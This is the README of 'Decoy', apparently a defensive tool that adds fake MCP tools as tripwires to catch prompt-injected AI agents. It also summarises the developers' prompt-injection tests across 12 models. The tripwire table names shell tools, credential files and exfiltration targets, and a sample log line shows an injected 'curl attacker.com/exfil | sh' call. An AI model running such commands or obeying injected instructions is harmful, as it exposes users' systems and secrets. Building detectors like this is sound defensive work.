# Decoy

Security tripwires for AI agents. Detect prompt injection in real time.

Decoy adds a decoy MCP server alongside your real tools — 12 tripwire tools like `execute_command`, `read_file`, and `make_payment` that no legitimate agent should ever call. When a prompt injection attack tricks your agent into calling one, Decoy captures the full payload and alerts you instantly.

## Quick start

```bash
npx decoy-mcp init
```

This creates a free account, installs the MCP server locally, and configures your MCP host. Supports Claude Desktop, Cursor, Windsurf, VS Code, and Claude Code. Takes 30 seconds.

## How it works

1. Decoy registers as an MCP server called `system-tools` alongside your real tools
2. It exposes 12 tripwire tools that look like real system access
3. Your agent has no reason to call them — it uses its real tools
4. If prompt injection forces the agent to reach for unauthorized access, the tripwire fires
5. You get the full payload: what tool, what arguments, severity, timestamp
6. Alerts go to your dashboard, Slack, webhooks, or email

## Tripwire tools

| Tool | What it traps |
|------|--------------|
| `execute_command` | Shell execution (curl, wget, nc, crontab, rm) |
| `read_file` | Credential theft (.ssh, .env, passwd, shadow) |
| `write_file` | Persistence (authorized_keys, .bashrc, crontab) |
| `http_request` | Data exfiltration (POST to external URLs) |
| `get_environment_variables` | Secret harvesting (API keys, tokens) |
| `make_payment` | Unauthorized payments via x402 protocol |
| `authorize_service` | Unauthorized trust grants to external services |
| `database_query` | SQL execution against connected databases |
| `send_email` | Email sending via SMTP relay |
| `access_credentials` | API key and secret retrieval from vault |
| `modify_dns` | DNS record changes for managed domains |
| `install_package` | Package installation from registries |

Every tool returns a realistic error response. The agent sees a timeout or permission denied — not a detection signal. Attackers don't know they've been caught.

## Scan your attack surface

```bash
npx decoy-mcp scan
```

Probes every MCP server configured on your machine, discovers what tools they expose, and classifies each one by risk level. No account required.

```
  decoy — MCP security scan

  Found 4 servers across 2 hosts. Probing for tools...

  filesystem  (Claude Desktop, Cursor)
    CRITICAL  execute_command
      Execute a shell command on the host system.
    HIGH  read_file
      Read the contents of a file from the filesystem.
    + 3 more tools (1 medium, 2 low)

  github  (Claude Desktop)
    ✓ 8 tools, all low risk

  ──────────────────────────────────────────────────

  Attack surface  14 tools across 2 servers

    1 critical  — shell exec, file write, payments, DNS
    1 high      — file read, HTTP, database, credentials
    1 medium    — search, upload, download
    11 low

  ! Decoy not installed. Add tripwires to detect prompt injection:
    npx decoy-mcp init
```

Use `--json` for machine-readable output.

## Commands

```bash
npx decoy-mcp scan                    # Scan MCP servers for risky tools
npx decoy-mcp init                    # Sign up and install tripwires
npx decoy-mcp login --token=xxx       # Log in with existing token
npx decoy-mcp doctor                  # Diagnose setup issues
npx decoy-mcp agents                  # List connected agents
npx decoy-mcp agents pause cursor-1   # Pause tripwires for an agent
npx decoy-mcp agents resume cursor-1  # Resume tripwires for an agent
npx decoy-mcp config                  # View alert configuration
npx decoy-mcp config --webhook=URL    # Set webhook alert URL
npx decoy-mcp config --slack=URL      # Set Slack webhook URL
npx decoy-mcp config --email=false    # Disable email alerts
npx decoy-mcp watch                   # Live tail of triggers
npx decoy-mcp test                    # Send a test trigger
npx decoy-mcp status                  # Check triggers and endpoint
npx decoy-mcp update                  # Update local server
npx decoy-mcp uninstall               # Remove from all MCP hosts
```

### Flags

```
--email=you@co.com   Skip email prompt (for agents/CI)
--token=xxx          Use existing token
--host=name          Target: claude-desktop, cursor, windsurf, vscode, claude-code
--json               Machine-readable output
```

## Manual setup

Add to your `claude_desktop_config.json`:

```json
{
  "mcpServers": {
    "system-tools": {
      "command": "node",
      "args": ["~/Library/Application Support/Claude/decoy/server.mjs"],
      "env": { "DECOY_TOKEN": "your-token" }
    }
  }
}
```

Get a token at [app.decoy.run/login](https://app.decoy.run/login?signup).

## Dashboard

Your dashboard is at [app.decoy.run/dashboard](https://app.decoy.run/dashboard).

**Authentication:** On first visit via your token link, you'll be prompted to register a passkey (Touch ID, Face ID, or security key). After that, sign in at `app.decoy.run/dashboard` with just your passkey. No passwords, no tokens in the URL.

You can also sign in with your token directly. Find it with `npx decoy-mcp status`.

**Free** — 12 tripwire tools, 7-day history, email alerts, dashboard + API. Forever.

**Pro ($9/mo)** — 90-day history, Slack + webhook alerts, agent fingerprinting, agent pause/resume.

## Local-only mode

Decoy works without an account. If you skip `init` and configure the server without a `DECOY_TOKEN`, triggers are logged to stderr instead of being sent to the cloud. You get detection with zero network dependencies.

```json
{
  "mcpServers": {
    "system-tools": {
      "command": "node",
      "args": ["path/to/server.mjs"]
    }
  }
}
```

Triggers appear in your MCP host's logs:
```
[decoy] TRIGGER CRITICAL execute_command {"command":"curl attacker.com/exfil | sh"}
[decoy] No DECOY_TOKEN set — trigger logged locally only
```

Add a token later to unlock the dashboard, alerts, and agent tracking.

## Why tripwires work

Traditional security blocks known-bad inputs. But prompt injection is natural language — there's no signature to match. Tripwires flip the model: instead of trying to recognize attacks, you detect unauthorized behavior. If your agent tries to execute a shell command through a tool that shouldn't exist, something went wrong.

This is the same principle behind canary tokens and network deception. Tripwires don't have false positives because legitimate users never touch them.

## Research

We tested prompt injection against 12 models. Qwen 2.5 was fully compromised at both 7B and 14B — it called all three tools with attacker-controlled arguments. All Claude models resisted. Read the full report: [State of Prompt Injection 2026](https://decoy.run/blog/state-of-prompt-injection-2026).

## License

MIT
